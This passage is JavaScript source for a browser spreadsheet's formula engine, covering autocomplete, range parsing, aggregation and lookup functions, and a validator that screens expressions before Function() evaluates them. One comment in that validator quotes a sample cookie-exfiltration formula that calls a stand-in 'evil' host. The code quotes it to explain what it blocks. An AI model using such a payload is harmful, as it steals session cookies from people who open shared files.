// Spreadsheet: function suggestions and @ ranges
//
// Part of the Lectern frontend. Loaded in order by main.js, which is
// the only entry point; these are plain scripts sharing one global
// scope, exactly as when this was a single file.

// ── FUNCTION SUGGESTIONS (autocomplete dropdown while editing a formula) ──

// Scans backward from the caret for a run of letters - that's the partial
// function name currently being typed, ignoring everything before it
// (cell refs, numbers, operators).
function getTypedWordBounds(text, caretPos)
{
  var start = caretPos;

  while (start > 0 && /[A-Za-z]/.test(text[start - 1]))
    start--;

  return { start: start, end: caretPos, word: text.slice(start, caretPos) };
}

function updateFunctionSuggestions(name)
{
  var inp = document.getElementById('inp-' + name);

  if (!inp || inp.readOnly)
  {
    hideFunctionSuggestions();
    return;
  }

  var text = inp.value,
      caretPos = inp.selectionStart;

  if (!text.startsWith('='))
  {
    hideFunctionSuggestions();
    return;
  }

  var bounds = getTypedWordBounds(text, caretPos);

  // Show the full list right as '=' is typed (caret at 1, nothing after it
  // yet); otherwise only while there's a letter run to filter against.
  if (!bounds.word && caretPos !== 1)
  {
    hideFunctionSuggestions();
    return;
  }

  var filter = bounds.word.toUpperCase(),
      matches = ALL_SHEET_FUNCTIONS.filter
      (
        function(fn)
        {
          return fn.bareName.indexOf(filter) === 0;
        }
      )
      .slice(0, 8);

  if (!matches.length)
  {
    hideFunctionSuggestions();
    return;
  }

  renderFunctionSuggestions(name, matches, bounds);
}

function renderFunctionSuggestions(name, matches, bounds)
{
  var td = document.getElementById('cell-' + name);

  if (!td)
    return;

  var dropdown = document.getElementById('function-suggest-dropdown');

  if (!dropdown)
  {
    dropdown = document.createElement('div');
    dropdown.id = 'function-suggest-dropdown';
    dropdown.className = 'function-suggest-dropdown';
  }

  dropdown.innerHTML = matches.map
  (
    function(fn, i)
    {
      return  '<div class="function-suggest-item' + (i === 0 ? ' active' : '') + '" onmousedown="pickFunctionSuggestion(event,' + i + ')">'+
                '<span class="function-suggest-name">' + escHtml(fn.signature) + '</span>'+
                '<span class="function-suggest-desc">' + escHtml(fn.desc) + '</span>'+
              '</div>';
    }
  ).join('');

  td.appendChild(dropdown);

  functionSuggestState = { name: name, matches: matches, bounds: bounds, activeIndex: 0 };
}

function hideFunctionSuggestions()
{
  var dropdown = document.getElementById('function-suggest-dropdown');

  if (dropdown)
    dropdown.remove();

  functionSuggestState = null;
}

function moveFunctionSuggestion(delta)
{
  if (!functionSuggestState)
    return;

  var count = functionSuggestState.matches.length;

  functionSuggestState.activeIndex = (functionSuggestState.activeIndex + delta + count) % count;

  document.querySelectorAll('.function-suggest-item').forEach
  (
    function(item, i)
    {
      item.classList.toggle('active', i === functionSuggestState.activeIndex);
    }
  );
}

function pickFunctionSuggestion(mouseEvent, index)
{
  mouseEvent.preventDefault();

  if (!functionSuggestState)
    return;

  insertFunctionSuggestion(functionSuggestState.matches[index]);
}

function insertFunctionSuggestion(fn)
{
  var state = functionSuggestState;

  if (!state || !fn)
    return;

  var inp = document.getElementById('inp-' + state.name);

  if (!inp)
    return;

  var insertText = fn.bareName + '(',
      before = inp.value.slice(0, state.bounds.start),
      after = inp.value.slice(state.bounds.end);

  inp.value = before + insertText + after;

  var caretPos = before.length + insertText.length;

  inp.focus();
  inp.setSelectionRange(caretPos, caretPos);

  sheetData[state.name] = inp.value;
  evaluateFormulas(state.name);
  saveSheetToFile();

  hideFunctionSuggestions();
}

function onCellFocus(name)
{
  selectCell(name);
}

function onCellInput(name)
{
  sheetData[name] = document.getElementById('inp-' + name).value;
  evaluateFormulas(name);
  saveSheetToFile();
  updateFunctionSuggestions(name);
  refreshRefHighlights();
}

function onCellBlur(name)
{
  var inp = document.getElementById('inp-' + name);

  if (!inp)
    return;

  var val = sheetData[name] || '';

  inp.value = val.startsWith('=') ? evalCell(name, val) : val;
  inp.classList.toggle('formula-result', val.startsWith('='));
  inp.readOnly = true;

  if (editingCell === name)
    editingCell = null;

  hideFunctionSuggestions();
  refreshFillHandle();
  refreshRefHighlights();
}

function getSelectionRefs(anchorRef, endRef)
{
  var anchor = parseName(anchorRef),
      end = parseName(endRef || anchorRef);

  if (!anchor)
    return [];

  if (!end)
    end = anchor;

  var anchorCol = colIndex(anchor.col),
      endCol = colIndex(end.col),
      rowStart = Math.min(anchor.row, end.row),
      rowEnd = Math.max(anchor.row, end.row),
      colStart = Math.min(anchorCol, endCol),
      colEnd = Math.max(anchorCol, endCol),
      refs = [];

  for (var r = rowStart; r <= rowEnd; r++)
    for (var c = colStart; c <= colEnd; c++)
      refs.push(colName(c) + r);

  return refs;
}

function deleteSelectedCells()
{
  var refs = getSelectionRefs(selectionAnchor, selectionEnd);

  if (!refs.length)
    return;

  sheetSnapshotForUndo();

  refs.forEach
  (
    function(ref)
    {
      delete sheetData[ref];

      var inp = document.getElementById('inp-' + ref);

      if (inp)
      {
        inp.value = '';
        inp.classList.remove('formula-result');
      }
    }
  );

  document.getElementById('formula-bar').value = '';
  evaluateFormulas();
  saveSheetToFile();
  refreshRefHighlights();
}

function cellKey(keyEvent, name)
{
  var inp = document.getElementById('inp-' + name);

  if (functionSuggestState && functionSuggestState.name === name)
  {
    if (keyEvent.key === 'ArrowDown')
    {
      keyEvent.preventDefault();
      moveFunctionSuggestion(1);
      return;
    }

    if (keyEvent.key === 'ArrowUp')
    {
      keyEvent.preventDefault();
      moveFunctionSuggestion(-1);
      return;
    }

    if (keyEvent.key === 'Enter' || keyEvent.key === 'Tab')
    {
      keyEvent.preventDefault();
      insertFunctionSuggestion(functionSuggestState.matches[functionSuggestState.activeIndex]);
      return;
    }

    if (keyEvent.key === 'Escape')
    {
      keyEvent.preventDefault();
      hideFunctionSuggestions();
      return;
    }
  }

  if (inp && inp.readOnly)
  {
    if (isTypingKey(keyEvent))
    {
      enterEditMode(name, '');
      return;
    }

    if (keyEvent.key === 'Delete')
    {
      keyEvent.preventDefault();
      deleteSelectedCells();
      return;
    }

    if (keyEvent.key !== 'Enter' && keyEvent.key !== 'Tab' &&
        keyEvent.key !== 'ArrowUp' && keyEvent.key !== 'ArrowDown' &&
        keyEvent.key !== 'ArrowLeft' && keyEvent.key !== 'ArrowRight')
      return;
  }
  else if (keyEvent.key !== 'Enter' && keyEvent.key !== 'Tab')
  {
    // Editing this cell: let arrows/backspace/etc. move the text caret natively.
    return;
  }

  var parsedName = parseName(name),
      currentRow = parsedName.row,
      currentColumn = colIndex(parsedName.col);

  if (keyEvent.key==='Enter' || keyEvent.key==='ArrowDown')
  {
    keyEvent.preventDefault();
    currentRow++;
  }
  else if (keyEvent.key==='ArrowUp')
  {
    keyEvent.preventDefault();
    currentRow--;
  }
  else if (keyEvent.key==='Tab'||keyEvent.key==='ArrowRight')
  {
    keyEvent.preventDefault();
    currentColumn++;
  }
  else if (keyEvent.key==='ArrowLeft')
  {
    keyEvent.preventDefault();
    currentColumn--;
  }
  else
    return;

  currentRow = Math.max(1, Math.min(ROWS, currentRow));
  currentColumn = Math.max(0, Math.min(COLS - 1, currentColumn));

  var next = colName(currentColumn) + currentRow,
      nextInput = document.getElementById('inp-' + next);

  if (nextInput)
  {
    nextInput.focus();
    selectCell(next);
  }
}

function onFormulaBarFocus()
{
  sheetSnapshotForUndo();
}

function formulaBarKey(keyEvent)
{
  if (keyEvent.key !== 'Enter')
    return;

  var ref = document.getElementById('cell-ref').value,
      val = document.getElementById('formula-bar').value;

  sheetData[ref] = val;

  var inp = document.getElementById('inp-' + ref);

  if (inp)
  {
    inp.value = evalCell(ref, val);
    inp.classList.toggle('formula-result', val.startsWith('='));
  }

  evaluateFormulas();
  saveSheetToFile();
}

function formulaBarInput()
{
  var ref = document.getElementById('cell-ref').value,
      val = document.getElementById('formula-bar').value;

  sheetData[ref] = val;

  var inp = document.getElementById('inp-' + ref);
  if (inp)
    inp.value = val;

  refreshRefHighlights();
}

// Splits a function's argument list on top-level commas, skipping commas
// that fall inside quoted strings or (defensively) nested parens.
function splitTopLevelArgs(text)
{
  var args = [],
      current = '',
      depth = 0,
      inQuote = false,
      quoteChar = '';

  for (var i = 0; i < text.length; i++)
  {
    var ch = text[i];

    if (inQuote)
    {
      current += ch;

      if (ch === quoteChar)
        inQuote = false;

      continue;
    }

    if (ch === '"' || ch === "'")
    {
      inQuote = true;
      quoteChar = ch;
      current += ch;
      continue;
    }

    if (ch === '(')
      depth++;
    else if (ch === ')')
      depth--;

    if (ch === ',' && depth === 0)
    {
      args.push(current);
      current = '';
      continue;
    }

    current += ch;
  }

  args.push(current);

  return args.map(function(a) { return a.trim(); });
}

// Converts a resolved JS value back into text that can be spliced into an
// expression string and safely re-evaluated (strings need quoting).
function formatForExpr(value)
{
  if (typeof value === 'string')
    return JSON.stringify(value);

  // A negative number spliced right after a '-' would read as the JS "--"
  // operator ("A1-(-2)" collapsing to "A1--2" is a SyntaxError); keep it
  // parenthesized so it always reads as a value.
  if (typeof value === 'number' && value < 0)
    return '(' + value + ')';

  return String(value);
}

// Final safety net before handing assembled text to the JS evaluator: the
// formula is built by splicing computed values into a string, so JS-only
// token traps need defusing. Runs of '-' are spaced apart (every '-' past
// the first is a unary negation — "5--3" means 5-(-3), not a decrement),
// and Excel's '^' power operator becomes JS's '**'. Quoted strings pass
// through untouched.
function sanitizeExprForEval(expr)
{
  return expr.replace
  (
    /"(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'|-{2,}|\^/g,
    function(m)
    {
      if (m === '^') return '**';
      if (m[0] === '-') return m.split('').join(' ');
      return m;
    }
  );
}

// Replaces cell references with literals usable in a JS expression: numeric
// cells become bare numbers, "TRUE"/"FALSE" become real booleans, text cells
// become quoted string literals, and formula cells resolve recursively.
function substituteCellRefs(exprText)
{
  return exprText.replace
  (
    /"(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'|(?<![A-Za-z])\$?([A-Z]{1,2})\$?(\d+)/g,
    function(match, c, r)
    {
      if (c === undefined)
        return match; // quoted string — ref-like text inside stays literal

      var ref = c + r,
          v = sheetData[ref];

      if (v === undefined || v === '')
        return '0';

      if (v.startsWith('='))
        v = evalCell(ref, v);

      var upper = v.toUpperCase();

      if (upper === 'TRUE' || upper === 'FALSE')
        return upper.toLowerCase();

      var num = parseFloat(v);

      if (isNaN(num))
        return JSON.stringify(v);

      // Parenthesize negatives so "A1-B1" with a negative B1 doesn't
      // collapse into the JS "--" operator.
      return num < 0 ? '(' + v + ')' : v;
    }
  );
}

// Last line of defence before the JS evaluator. Formulas are a JS-expression
// dialect (numbers, strings, the arithmetic/comparison/logical operators,
// ternaries), so by the time an expression reaches Function() every cell ref
// and named function should already be resolved to a literal. Anything else -
// a bare identifier like `fetch`, `document`, `constructor`, or a stray `[`,
// backtick, or `\` - means untrusted text survived substitution, and must
// never be handed to Function(): a shared .mds could otherwise smuggle
// `=fetch('//evil/'+document.cookie)` through as running JavaScript. We strip
// string and numeric literals (which are data, and may legitimately contain
// letters like the `e` in `1e5`), then reject any remaining identifier that
// isn't a boolean literal, and any character outside the operator set.
function assertSafeEvalExpr(expr)
{
  var stripped = String(expr)
    .replace(/"(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'/g, ' ')          // string literals
    .replace(/\b0[xX][0-9a-fA-F]+\b/g, ' ')                         // hex numbers
    .replace(/(?:\d+\.?\d*|\.\d+)(?:[eE][+-]?\d+)?/g, ' ');         // decimal / scientific

  var idRe = /[A-Za-z_$][A-Za-z0-9_$]*/g,
      m;

  while ((m = idRe.exec(stripped)))
  {
    if (m[0] !== 'true' && m[0] !== 'false')
      throw new Error('disallowed identifier in formula: ' + m[0]);
  }

  var leftover = stripped.replace(/true|false/g, ' ');

  // Allowed: whitespace, arithmetic/comparison/logical/bitwise operators,
  // ternary, grouping, and the argument comma. Notably NOT: [ ] { } ` \ ; @ #.
  if (/[^\s+\-*/%<>=!&|^~?:().,]/.test(leftover))
    throw new Error('disallowed character in formula');
}

// Validates then evaluates a fully-substituted expression. Every path that
// feeds assembled formula text to Function() goes through here.
function evalFinalExpr(expr)
{
  assertSafeEvalExpr(expr);
  return Function('"use strict"; return (' + expr + ')')();
}

// Evaluates a flat (no nested parens) sub-expression like "A3-A4" or "5*2",
// resolving any cell references first - used as the argument to scalar
// functions such as ABS/ROUND/SQRT/IF/etc.
function resolveValue(exprText)
{
  return evalFinalExpr(sanitizeExprForEval(substituteCellRefs(exprText)));
}

// Resolves innermost parenthesis groups that are NOT function calls (the
// preceding character isn't part of a name like ROUND or LOG10) into their
// computed value. Ranges (A1:B3) are skipped — those belong to whichever
// aggregation function wraps them. Groups that fail to evaluate are left
// untouched, so an unresolvable formula still degrades to #ERR normally.
function resolveBareGroups(expr)
{
  return expr.replace
  (
    /(?<![A-Za-z0-9_])\(([^()]+)\)/g,
    function(match, inner)
    {
      if (inner.indexOf(':') !== -1)
        return match;

      try { return formatForExpr(resolveValue(inner)); }
      catch(e) { return match; }
    }
  );
}

function cellNumericValue(ref)
{
  var v = sheetData[ref];

  if (v === undefined || v === '')
    return 0;

  if (v.startsWith('='))
    v = evalCell(ref, v);

  var n = parseFloat(v);

  return isNaN(n) ? 0 : n;
}

// The used extent of the active page — whole-column (A:A) and whole-row
// (4:4) ranges cover this instead of the unbounded grid, so they only walk
// cells that actually hold something.
function sheetUsedExtent()
{
  var maxRow = 1, maxCol = 0;

  Object.keys(sheetData).forEach(function(ref)
  {
    if (!sheetData[ref]) return;
    var p = parseName(ref);
    if (!p) return;
    if (p.row > maxRow) maxRow = p.row;
    var c = colIndex(p.col);
    if (c > maxCol) maxCol = c;
  });

  return { maxRow: maxRow, maxCol: maxCol };
}

function getRangeRefs(range)
{
  var text = range.trim(), refs, i, j;

  // Whole-column range: A:A grabs one column, A:C a block of columns.
  var colRange = text.match(/^\$?([A-Z]{1,2})\s*:\s*\$?([A-Z]{1,2})$/);
  if (colRange)
  {
    var cLo = colIndex(colRange[1]), cHi = colIndex(colRange[2]);
    if (cLo > cHi) { var cT = cLo; cLo = cHi; cHi = cT; }

    refs = [];
    var lastRow = sheetUsedExtent().maxRow;
    for (i = 1; i <= lastRow; i++)
      for (j = cLo; j <= cHi; j++)
        refs.push(colName(j) + i);
    return refs;
  }

  // Whole-row range: 4:4 grabs one row, 2:5 a block of rows.
  var rowRange = text.match(/^\$?(\d+)\s*:\s*\$?(\d+)$/);
  if (rowRange)
  {
    var rLo = parseInt(rowRange[1]), rHi = parseInt(rowRange[2]);
    if (rLo > rHi) { var rT = rLo; rLo = rHi; rHi = rT; }

    refs = [];
    var lastCol = sheetUsedExtent().maxCol;
    for (i = rLo; i <= rHi; i++)
      for (j = 0; j <= lastCol; j++)
        refs.push(colName(j) + i);
    return refs;
  }

  var parts = range.split(':');

  if (parts.length === 1)
  {
    var single = parseName(parts[0].trim());
    return single ? [single.col + single.row] : [];
  }

  var pa = parseName(parts[0].trim()),
      pb = parseName(parts[1].trim());

  if (!pa || !pb)
    return [];

  var refs = [];

  for (var i = pa.row; i <= pb.row; i++)
    for (var j = colIndex(pa.col); j <= colIndex(pb.col); j++)
      refs.push(colName(j) + i);

  return refs;
}

function getRangeVals(range)
{
  return getRangeRefs(range).map(cellNumericValue);
}

// Cell refs covered by one aggregation argument: a range (A1:B3) or a single
// ref (A1). Returns null for anything else (a literal or an expression), so
// callers can fall back to value-based handling.
function argCellRefs(arg)
{
  if (arg.indexOf(':') !== -1)
  {
    var refs = getRangeRefs(arg);
    return refs.length ? refs : null;
  }

  var single = parseName(arg.trim());
  return single ? [single.col + single.row] : null;
}

// Collects the numeric values behind a mixed aggregation argument list:
// each argument may be a range, a single ref, a literal, or any expression
// the resolver can evaluate — so MAX(A1,B2), MAX(3,7), SUM(A1:A4, 10) and
// AVG(A1, (B1+1)*2) all behave like they do in a real spreadsheet.
function aggregateArgValues(argText)
{
  var vals = [];

  splitTopLevelArgs(argText).forEach(function(arg)
  {
    if (!arg)
      return;

    var refs = argCellRefs(arg);
    if (refs)
    {
      refs.forEach(function(ref) { vals.push(cellNumericValue(ref)); });
      return;
    }

    var v = resolveValue(arg),
        n = (typeof v === 'number') ? v : parseFloat(v);
    vals.push(isNaN(n) ? 0 : n);
  });

  return vals;
}

function sumRange(r)
{
  return aggregateArgValues(r).reduce
  (
    function(a, b)
    {
      return a + b;
    },
    0
  );
}

function avgRange(r)
{
  var vals = aggregateArgValues(r);
  return vals.length ? vals.reduce(function(a, b){ return a + b; }, 0) / vals.length : 0;
}

function countRange(r)
{
  var total = 0;
  splitTopLevelArgs(r).forEach(function(arg)
  {
    if (!arg) return;
    var refs = argCellRefs(arg);
    total += refs ? refs.length : 1;
  });
  return total;
}

function countaRange(r)
{
  var total = 0;
  splitTopLevelArgs(r).forEach(function(arg)
  {
    if (!arg) return;
    var refs = argCellRefs(arg);
    if (refs)
      total += refs.filter(function(ref) { return (sheetData[ref] || '') !== ''; }).length;
    else
      total += 1; // a literal/expression argument is inherently non-blank
  });
  return total;
}

function countBlankRange(r)
{
  var total = 0;
  splitTopLevelArgs(r).forEach(function(arg)
  {
    if (!arg) return;
    var refs = argCellRefs(arg);
    if (refs)
      total += refs.filter(function(ref) { return (sheetData[ref] || '') === ''; }).length;
  });
  return total;
}

function maxRange(r)
{
  var vals = aggregateArgValues(r);
  return vals.length ? Math.max.apply(null, vals) : 0;
}

function minRange(r)
{
  var vals = aggregateArgValues(r);
  return vals.length ? Math.min.apply(null, vals) : 0;
}

function medianRange(r)
{
  var vals = aggregateArgValues(r).slice().sort(function(a, b) { return a - b; }),
      len = vals.length;

  if (!len)
    return 0;

  var mid = Math.floor(len / 2);

  return (len % 2) ? vals[mid] : (vals[mid - 1] + vals[mid]) / 2;
}

function productRange(r)
{
  return aggregateArgValues(r).reduce
  (
    function(a, b)
    {
      return a * b;
    },
    1
  );
}

function varianceRange(r)
{
  var vals = aggregateArgValues(r),
      n = vals.length;

  if (n < 2)
    return 0;

  var mean = vals.reduce(function(a, b) { return a + b; }, 0) / n;

  return vals.reduce(function(a, b) { return a + Math.pow(b - mean, 2); }, 0) / (n - 1);
}

function stdevRange(r)
{
  return Math.sqrt(varianceRange(r));
}

// A cell's value as an expression literal (numbers bare, TRUE/FALSE bare,
// text quoted, blanks 0) — the same shape substituteCellRefs produces, so
// lookup functions can drop their result straight into the formula text.
function cellExprLiteral(ref)
{
  var v = sheetData[ref];

  if (v === undefined || v === '')
    return '0';

  if (v.startsWith('='))
    v = evalCell(ref, v);

  var upper = String(v).toUpperCase();

  if (upper === 'TRUE' || upper === 'FALSE')
    return upper.toLowerCase();

  var num = parseFloat(v);

  if (isNaN(num))
    return JSON.stringify(v);

  // Parenthesize negatives so "A1-B1" with a negative B1 doesn't collapse
  // into the JS "--" operator.
  return num < 0 ? '(' + v + ')' : v;
}

function refsBoundingBox(refs)
{
  var minRow = Infinity, maxRow = 0, minCol = Infinity, maxCol = 0;

  refs.forEach(function(ref)
  {
    var p = parseName(ref);
    if (!p) return;
    minRow = Math.min(minRow, p.row); maxRow = Math.max(maxRow, p.row);
    minCol = Math.min(minCol, colIndex(p.col)); maxCol = Math.max(maxCol, colIndex(p.col));
  });

  return { minRow: minRow, maxRow: maxRow, minCol: minCol, maxCol: maxCol };
}

// True when a displayed cell value matches a lookup target — numerically
// when both sides are numbers, case-insensitive text comparison otherwise.
function lookupValueMatches(value, target)
{
  var targetNum = (typeof target === 'number') ? target : parseFloat(target),
      targetIsNum = (typeof target === 'number') || (String(target).trim() !== '' && !isNaN(targetNum));

  if (targetIsNum)
    return value !== '' && parseFloat(value) === targetNum;

  return String(value).toLowerCase() === String(target).toLowerCase();
}

// INDEX(range, row, [col]) — the value at a position inside a range. For a
// single-row range the second argument indexes along the row (like Excel's
// one-dimensional form), otherwise it picks the row and the optional third
// argument picks the column (both 1-based, defaulting to 1). The result is
// formatted like a substituted cell ref, so text comes back quoted and blank
// cells come back as 0.
function indexRange(argText)
{
  var args = splitTopLevelArgs(argText),
      refs = argCellRefs(args[0]);

  if (!refs || !refs.length)
    throw new Error('INDEX needs a range');

  var box = refsBoundingBox(refs),
      height = box.maxRow - box.minRow + 1,
      width = box.maxCol - box.minCol + 1,
      rowNum = args[1] !== undefined ? resolveValue(args[1]) : 1,
      colNum;

  if (args[2] !== undefined)
    colNum = resolveValue(args[2]);
  else if (height === 1 && width > 1)
  {
    colNum = rowNum;
    rowNum = 1;
  }
  else
    colNum = 1;

  if (rowNum < 1 || rowNum > height || colNum < 1 || colNum > width)
    throw new Error('INDEX out of range');

  return cellExprLiteral(colName(box.minCol + colNum - 1) + (box.minRow + rowNum - 1));
}

// VLOOKUP(value, range, colIndex) — finds the first row whose FIRST-column
// value matches, then returns that row's value from the 1-based colIndex-th
// column of the range. Exact matching only. HLOOKUP is the same across rows.
function vlookupRange(argText)
{
  var args = splitTopLevelArgs(argText),
      target = resolveValue(args[0]),
      refs = argCellRefs(args[1]);

  if (!refs || !refs.length || args[2] === undefined)
    throw new Error('VLOOKUP needs a value, range, and column index');

  var box = refsBoundingBox(refs),
      colOffset = resolveValue(args[2]) - 1;

  if (colOffset < 0 || box.minCol + colOffset > box.maxCol)
    throw new Error('VLOOKUP column index out of range');

  for (var r = box.minRow; r <= box.maxRow; r++)
    if (lookupValueMatches(getDisplayValue(colName(box.minCol) + r), target))
      return cellExprLiteral(colName(box.minCol + colOffset) + r);

  return '"#N/A"';
}

function hlookupRange(argText)
{
  var args = splitTopLevelArgs(argText),
      target = resolveValue(args[0]),
      refs = argCellRefs(args[1]);

  if (!refs || !refs.length || args[2] === undefined)
    throw new Error('HLOOKUP needs a value, range, and row index');

  var box = refsBoundingBox(refs),
      rowOffset = resolveValue(args[2]) - 1;

  if (rowOffset < 0 || box.minRow + rowOffset > box.maxRow)
    throw new Error('HLOOKUP row index out of range');

  for (var c = box.minCol; c <= box.maxCol; c++)
    if (lookupValueMatches(getDisplayValue(colName(c) + box.minRow), target))
      return cellExprLiteral(colName(c) + (box.minRow + rowOffset));

  return '"#N/A"';
}

// MATCH(value, range) — 1-based position of the first exact match walking
// the range row-major (use a single row or column range, like in Excel).
function matchRange(argText)
{
  var args = splitTopLevelArgs(argText),
      target = resolveValue(args[0]),
      refs = argCellRefs(args[1]);

  if (!refs || !refs.length)
    throw new Error('MATCH needs a range');

  for (var i = 0; i < refs.length; i++)
    if (lookupValueMatches(getDisplayValue(refs[i]), target))
      return i + 1;

  return '"#N/A"';
}

// Excel-style criterion (">5", "<>0", "apples", 12) → a predicate over a
// cell's displayed value, shared by COUNTIF / SUMIF / AVERAGEIF.
function makeCriterionTest(rawArg)
{
  var crit = resolveValue(rawArg),
      s = String(crit),
      m = s.match(/^(>=|<=|<>|=|>|<)([\s\S]*)$/),
      op = m ? m[1] : '=',
      rhs = m ? m[2] : s,
      rhsNum = parseFloat(rhs),
      rhsIsNum = rhs.trim() !== '' && !isNaN(rhsNum);

  return function(value)
  {
    var num = parseFloat(value),
        bothNum = rhsIsNum && value !== '' && !isNaN(num);

    switch (op)
    {
      case '>':  return bothNum && num > rhsNum;
      case '<':  return bothNum && num < rhsNum;
      case '>=': return bothNum && num >= rhsNum;
      case '<=': return bothNum && num <= rhsNum;
      case '<>': return bothNum ? num !== rhsNum : String(value).toLowerCase() !== rhs.toLowerCase();
      default:   return bothNum ? num === rhsNum : String(value).toLowerCase() === rhs.toLowerCase();
    }
  };
}

function countifRange(argText)
{
  var args = splitTopLevelArgs(argText),
      refs = argCellRefs(args[0]);

  if (!refs)
    throw new Error('COUNTIF needs a range');

  var test = makeCriterionTest(args[1]);

  return refs.filter(function(ref){ return test(getDisplayValue(ref)); }).length;
}

// SUMIF(range, criterion, [sumRange]): sums sumRange (default: the range
// itself) wherever the criterion matches the corresponding range cell.
function sumifRange(argText)
{
  var args = splitTopLevelArgs(argText),
      refs = argCellRefs(args[0]);

  if (!refs)
    throw new Error('SUMIF needs a range');

  var test = makeCriterionTest(args[1]),
      sumRefs = args[2] !== undefined ? argCellRefs(args[2]) : refs,
      total = 0;

  refs.forEach(function(ref, i)
  {
    if (test(getDisplayValue(ref)) && sumRefs && sumRefs[i] !== undefined)
      total += cellNumericValue(sumRefs[i]);
  });

  return total;
}

function averageifRange(argText)
{
  var args = splitTopLevelArgs(argText),
      refs = argCellRefs(args[0]);

  if (!refs)
    throw new Error('AVERAGEIF needs a range');

  var test = makeCriterionTest(args[1]),
      avgRefs = args[2] !== undefined ? argCellRefs(args[2]) : refs,
      total = 0,
      count = 0;

  refs.forEach(function(ref, i)
  {
    if (test(getDisplayValue(ref)) && avgRefs && avgRefs[i] !== undefined)
    {
      total += cellNumericValue(avgRefs[i]);
      count++;
    }
  });

  if (!count)
    throw new Error('AVERAGEIF matched nothing');

  return total / count;
}

// LARGE/SMALL(values..., k): the k-th largest/smallest value (1-based). The
// LAST argument is k and everything before it supplies values — so both
// LARGE(A1:A9, 2) and an @-expanded LARGE(@A1:A5*@B1:B5, 2) work.
function largeSmallRange(argText, wantLargest)
{
  var args = splitTopLevelArgs(argText),
      k = 1,
      valueArgs = args;

  if (args.length > 1)
  {
    k = resolveValue(args[args.length - 1]);
    valueArgs = args.slice(0, -1);
  }

  var vals = aggregateArgValues(valueArgs.join(',')).slice().sort
      (
        function(a, b) { return wantLargest ? b - a : a - b; }
      );

  if (k < 1 || k > vals.length)
    throw new Error('k out of range');

  return vals[k - 1];
}

// Runs every named-function pattern once. Each pattern requires a function
// name not preceded by a letter (so e.g. OR doesn't match inside FLOOR, or
// AND inside RAND) and an argument with no unresolved nested parens. evalCell
// re-runs this pass until the text stops changing, which is what lets calls
// like ROUND(SUM(A1:A4),2) resolve correctly regardless of nesting order.
function applyFunctionPass(expr, selfRef)
{
  return expr
    .replace(/(?<![A-Za-z])SUM\(([^()]+)\)/gi, function(_, r) { return sumRange(r); })
    .replace(/(?<![A-Za-z])AVG\(([^()]+)\)/gi, function(_, r) { return avgRange(r); })
    .replace(/(?<![A-Za-z])MEAN\(([^()]+)\)/gi, function(_, r) { return avgRange(r); })
    .replace(/(?<![A-Za-z])COUNTA\(([^()]+)\)/gi, function(_, r) { return countaRange(r); })
    .replace(/(?<![A-Za-z])COUNTBLANK\(([^()]+)\)/gi, function(_, r) { return countBlankRange(r); })
    .replace(/(?<![A-Za-z])COUNT\(([^()]+)\)/gi, function(_, r) { return countRange(r); })
    .replace(/(?<![A-Za-z])MAX\(([^()]+)\)/gi, function(_, r) { return maxRange(r); })
    .replace(/(?<![A-Za-z])MIN\(([^()]+)\)/gi, function(_, r) { return minRange(r); })
    .replace(/(?<![A-Za-z])MEDIAN\(([^()]+)\)/gi, function(_, r) { return medianRange(r); })
    .replace(/(?<![A-Za-z])PRODUCT\(([^()]+)\)/gi, function(_, r) { return productRange(r); })
    .replace(/(?<![A-Za-z])STDEV\(([^()]+)\)/gi, function(_, r) { return stdevRange(r); })
    .replace(/(?<![A-Za-z])VAR\(([^()]+)\)/gi, function(_, r) { return varianceRange(r); })
    .replace(/(?<![A-Za-z])INDEX\(([^()]+)\)/gi, function(_, a) { return indexRange(a); })
    .replace(/(?<![A-Za-z])VLOOKUP\(([^()]+)\)/gi, function(_, a) { return vlookupRange(a); })
    .replace(/(?<![A-Za-z])HLOOKUP\(([^()]+)\)/gi, function(_, a) { return hlookupRange(a); })
    .replace(/(?<![A-Za-z])MATCH\(([^()]+)\)/gi, function(_, a) { return matchRange(a); })
    .replace(/(?<![A-Za-z])COUNTIF\(([^()]+)\)/gi, function(_, a) { return countifRange(a); })
    .replace(/(?<![A-Za-z])SUMIF\(([^()]+)\)/gi, function(_, a) { return sumifRange(a); })
    .replace(/(?<![A-Za-z])AVERAGEIF\(([^()]+)\)/gi, function(_, a) { return averageifRange(a); })
    .replace(/(?<![A-Za-z])AVERAGE\(([^()]+)\)/gi, function(_, r) { return avgRange(r); })
    .replace(/(?<![A-Za-z])LARGE\(([^()]+)\)/gi, function(_, a) { return largeSmallRange(a, true); })
    .replace(/(?<![A-Za-z])SMALL\(([^()]+)\)/gi, function(_, a) { return largeSmallRange(a, false); })
    .replace
    (
      /(?<![A-Za-z])ROW\(([^()]*)\)/gi,
      function(match, a)
      {
        var p = parseName((a.trim() || selfRef || '').replace(/\$/g, '').toUpperCase());
        return p ? p.row : match;
      }
    )
    .replace
    (
      /(?<![A-Za-z])COLUMN\(([^()]*)\)/gi,
      function(match, a)
      {
        var p = parseName((a.trim() || selfRef || '').replace(/\$/g, '').toUpperCase());
        return p ? colIndex(p.col) + 1 : match;
      }
    )
    .replace(/(?<![A-Za-z])SIN\(([^()]+)\)/gi, function(_, a) { return Math.sin(resolveValue(a)); })
    .replace(/(?<![A-Za-z])COS\(([^()]+)\)/gi, function(_, a) { return Math.cos(resolveValue(a)); })
    .replace(/(?<![A-Za-z])TAN\(([^()]+)\)/gi, function(_, a) { return Math.tan(resolveValue(a)); })
    .replace(/(?<![A-Za-z])ASIN\(([^()]+)\)/gi, function(_, a) { return Math.asin(resolveValue(a)); })
    .replace(/(?<![A-Za-z])ACOS\(([^()]+)\)/gi, function(_, a) { return Math.acos(resolveValue(a)); })
    .replace(/(?<![A-Za-z])ATAN2\(([^()]+)\)/gi, function(_, a)
    {
      // Excel argument order is (x, y); JS atan2 takes (y, x).
      var args = splitTopLevelArgs(a);
      return Math.atan2(resolveValue(args[1]), resolveValue(args[0]));
    })
    .replace(/(?<![A-Za-z])ATAN\(([^()]+)\)/gi, function(_, a) { return Math.atan(resolveValue(a)); })
    .replace(/(?<![A-Za-z])SINH\(([^()]+)\)/gi, function(_, a) { return Math.sinh(resolveValue(a)); })
    .replace(/(?<![A-Za-z])COSH\(([^()]+)\)/gi, function(_, a) { return Math.cosh(resolveValue(a)); })
    .replace(/(?<![A-Za-z])TANH\(([^()]+)\)/gi, function(_, a) { return Math.tanh(resolveValue(a)); })
